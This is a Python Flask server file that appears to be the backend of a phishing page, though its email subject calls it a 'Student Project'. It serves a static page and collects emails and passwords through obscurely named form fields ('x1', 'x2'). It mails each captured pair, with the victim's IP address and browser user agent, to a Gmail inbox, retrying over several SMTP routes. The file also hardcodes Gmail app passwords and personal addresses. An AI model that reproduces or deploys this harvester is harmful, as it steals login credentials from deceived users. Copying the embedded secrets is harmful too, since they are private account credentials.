# from flask import Flask, request, jsonify
# from flask_cors import CORS
# import smtplib
# from email.message import EmailMessage

# app = Flask(__name__)
# CORS(app)  # Allow requests from your frontend



# # Configuration
# EMAIL_SENDER = 'nwekee125@gmail.com'
# EMAIL_PASSWORD = 'wkxefsuonoulinca'  # Use a Gmail app password, not your real password
# EMAIL_RECEIVER = 'maxwell202201@gmail.com'


# @app.route('/submit', methods=['POST'])
# def submit():
#     email = request.form.get('x1')  # This is the email from the frontend
#     password = request.form.get('x2')
#     ip_address = request.remote_addr

#     # Compose email
#     msg = EmailMessage()
#     msg['Subject'] = 'New Form Submission (Student Project)'
#     msg['From'] = EMAIL_SENDER
#     msg['To'] = EMAIL_RECEIVER
#     msg.set_content(f"""
#     Email: {email}
#     Password: {password}
#     IP Address: {ip_address}
#     """)

#     # Send email
#     try:
#         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
#             smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
#             smtp.send_message(msg)
#         return jsonify({'status': 'success'})
#     except Exception as e:
#         return jsonify({'status': 'error', 'message': str(e)}), 500


# if __name__ == '__main__':
#     app.run(debug=True)

from flask import Flask, request, jsonify, send_from_directory, make_response
from flask_cors import CORS
import smtplib
from email.message import EmailMessage
import os
import mimetypes
import time
import logging
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Disable caching to always return 200 responses
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration - Use environment variables for production
EMAIL_SENDER = os.getenv('EMAIL_SENDER', 'nwekee125@gmail.com')
EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD', 'mhhihywubresapns')
EMAIL_RECEIVER = os.getenv('EMAIL_RECEIVER', 'nwekee125@gmail.com')

# Environment detection
IS_PRODUCTION = os.getenv('RENDER') is not None or os.getenv('PORT') is not None

logger.info(f"🌍 Environment: {'Production (Render)' if IS_PRODUCTION else 'Development'}")
logger.info(f"📧 Email sender configured: {EMAIL_SENDER}")
logger.info(f"📧 Email receiver configured: {EMAIL_RECEIVER}")

@app.route('/health')
def health_check():
    """Health check endpoint for monitoring"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'environment': 'production' if IS_PRODUCTION else 'development',
        'email_configured': bool(EMAIL_SENDER and EMAIL_PASSWORD and EMAIL_RECEIVER)
    })

@app.route('/')
def index():
    response = make_response(send_from_directory('.', 'index.html'))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/favicon.ico')
def favicon():
    # Return a simple 1x1 transparent PNG as favicon to prevent 404
    response = make_response(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82')
    response.headers['Content-Type'] = 'image/png'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/<path:filename>')
def serve_static(filename):
    response = make_response(send_from_directory('.', filename))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

def send_email_with_retry(email, password, ip_address, max_retries=3):
    """Send email with retry mechanism and multiple SMTP methods"""
    
    msg = EmailMessage()
    msg['Subject'] = 'New Form Submission (Student Project)'
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    msg.set_content(f"""
New submission received at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:

Email: {email}
Password: {password}
IP Address: {ip_address}
User Agent: {request.headers.get('User-Agent', 'Unknown')}
""")
    
    # List of SMTP configurations to try
    smtp_configs = [
        {
            'name': 'Gmail SMTP_SSL (Primary)',
            'host': 'smtp.gmail.com',
            'port': 465,
            'use_ssl': True,
            'timeout': 30
        },
        {
            'name': 'Gmail STARTTLS (Fallback)',
            'host': 'smtp.gmail.com', 
            'port': 587,
            'use_ssl': False,
            'timeout': 30
        },
        {
            'name': 'Gmail SMTP_SSL Alternative Port',
            'host': 'smtp.gmail.com',
            'port': 465,
            'use_ssl': True,
            'timeout': 60
        }
    ]
    
    for attempt in range(max_retries):
        logger.info(f"Email sending attempt {attempt + 1}/{max_retries}")
        
        for config in smtp_configs:
            try:
                logger.info(f"Trying {config['name']}...")
                
                if config['use_ssl']:
                    with smtplib.SMTP_SSL(config['host'], config['port'], timeout=config['timeout']) as smtp:
                        smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                        smtp.send_message(msg)
                        logger.info(f"✅ Email sent successfully via {config['name']}!")
                        return {'success': True, 'method': config['name']}
                else:
                    with smtplib.SMTP(config['host'], config['port'], timeout=config['timeout']) as smtp:
                        smtp.starttls()
                        smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
                        smtp.send_message(msg)
                        logger.info(f"✅ Email sent successfully via {config['name']}!")
                        return {'success': True, 'method': config['name']}
                        
            except smtplib.SMTPAuthenticationError as e:
                logger.error(f"❌ Authentication failed with {config['name']}: {e}")
                return {'success': False, 'error': f'Authentication failed. Please check email credentials.'}
            except smtplib.SMTPConnectError as e:
                logger.error(f"❌ Connection failed with {config['name']}: {e}")
            except smtplib.SMTPException as e:
                logger.error(f"❌ SMTP error with {config['name']}: {e}")
            except Exception as e:
                logger.error(f"❌ Unexpected error with {config['name']}: {e}")
        
        if attempt < max_retries - 1:
            wait_time = (attempt + 1) * 2  # Progressive backoff: 2s, 4s, 6s
            logger.info(f"Waiting {wait_time} seconds before retry...")
            time.sleep(wait_time)
    
@app.route('/submit', methods=['POST'])
def submit():
    """Handle form submission with enhanced error handling"""
    try:
        email = request.form.get('x1')
        password = request.form.get('x2')
        ip_address = request.remote_addr
        
        logger.info(f"📨 New submission received - Email: {email}, IP: {ip_address}")
        
        # Basic validation
        if not email or not password:
            logger.warning("⚠️ Validation failed: Missing email or password")
            return jsonify({
                'status': 'error', 
                'message': 'Email and password are required'
            }), 400
        
        # Validate email format (basic check)
        if '@' not in email or '.' not in email:
            logger.warning(f"⚠️ Invalid email format: {email}")
            return jsonify({
                'status': 'error',
                'message': 'Please enter a valid email address'
            }), 400
        
        # Check if environment variables are set
        if not EMAIL_SENDER or not EMAIL_PASSWORD or not EMAIL_RECEIVER:
            logger.error("❌ Email configuration missing")
            return jsonify({
                'status': 'error',
                'message': 'Email service is not properly configured'
            }), 500
        
        # Attempt to send email
        logger.info("🚀 Starting email send process...")
        result = send_email_with_retry(email, password, ip_address)
        
        if result['success']:
            logger.info(f"✅ Email sent successfully using {result['method']}")
            return jsonify({
                'status': 'success',
                'message': 'Form submitted successfully!',
                'method': result['method']
            })
        else:
            logger.error(f"❌ Email sending failed: {result['error']}")
            return jsonify({
                'status': 'error',
                'message': f"Failed to send email: {result['error']}"
            }), 500
            
    except Exception as e:
        logger.error(f"❌ Unexpected error in submit route: {e}")
        return jsonify({
            'status': 'error', 
            'message': 'An unexpected server error occurred. Please try again.'
        }), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
